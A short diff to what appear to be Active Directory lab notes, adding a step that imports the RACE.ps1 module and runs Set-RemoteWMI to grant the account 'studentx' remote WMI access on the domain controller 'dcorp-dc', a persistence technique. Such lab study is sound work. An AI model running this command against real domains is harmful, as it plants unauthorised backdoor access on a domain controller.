@@ -535,4 +535,7 @@ Import the RACE.ps1 module
 ```powershell
 . C:\AD\Tools\RACE.ps1
 ```
-And enavle 
+And modify the service
+```powershell
+Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
+```
